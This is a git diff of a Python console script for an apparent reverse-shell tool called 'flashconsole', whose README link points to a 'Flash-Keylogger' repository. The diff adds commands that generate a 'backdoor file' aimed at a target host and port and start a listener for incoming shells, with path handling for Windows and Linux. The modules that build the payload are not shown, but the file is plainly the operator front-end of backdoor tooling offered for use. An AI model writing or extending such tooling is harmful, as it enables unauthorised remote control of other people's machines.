@@ -1,7 +1,26 @@
+import platform
+
 import client_side
 import server_side
 from termcolor import colored
 import os
+
+
+def flashconsole():
+    print(colored('[+] STARTING FLASHCONSOLE [+]', 'blue'))
+    console_running = True
+    while console_running:
+        input_command = input("flashconsole > ")
+        # Flashex for Flash Exploit
+        if 'flashex --create' in input_command:
+            command_parts = input_command.split(" ")
+            target_host = command_parts[2]
+            target_port = command_parts[3]
+            create_rs(target_host, target_port)
+        elif 'flashex --listen' in input_command:
+            command_parts = input_command.split(" ")
+            listening_port = command_parts[2]
+            listen_rs(int(listening_port))
 
 
 def create_rs(target_host, target_port):
@@ -21,7 +40,10 @@ def create_rs(target_host, target_port):
             print(colored('File already exists, please choose another name!', 'red'))
         else:
             # Set the complete path of the backdoor file
-            complete_path = path + '\\' + file_name
+            if platform.system() == 'Windows':
+                complete_path = path + '\\' + file_name
+            elif platform.system() == 'Linux':
+                complete_path = path + '/' + file_name
         # And finally, run the client side main function to write backdoor file
         client_side.main(target_host, target_port, complete_path)
         if os.path.isfile(complete_path):
@@ -33,25 +55,12 @@ def create_rs(target_host, target_port):
         print(colored('Path "' + path_input + '" doesnt exist!', 'red'))
 
 
-print(colored('WELCOME TO FLASH-REVERSE-SHELL!', 'blue'))
+def listen_rs(listening_port):
+    server_side.main(listening_port)
+
+
+print(colored('WELCOME TO FLASHCONSOLE!', 'blue'))
 print(colored('For documentation on commands and uses, please visit the following repository:'))
 print("https://github.com/FujiwaraChoki/Flash-Keylogger")
 
-while True:
-    console_command = input('flashconsole > ')
-    parts = console_command.split(" ")
-    if console_command == 'flashrs '+parts[1]:
-        while True:
-            options = input('flashrs > ')
-            parts_options = options.split(" ")
-            thost = ''
-            lhost = ''
-            port = 0
-            if '--create' in options:
-                if options == 'THOST='+parts_options[1]:
-                    thost = parts_options[1]
-                elif options == 'LHOST='+parts_options[2]:
-                    lhost = parts_options[1]
-                elif options == 'PORT='+str(parts_options[3]):
-                    port = parts_options[1]
-                create_rs(thost, lhost, port)
+flashconsole()
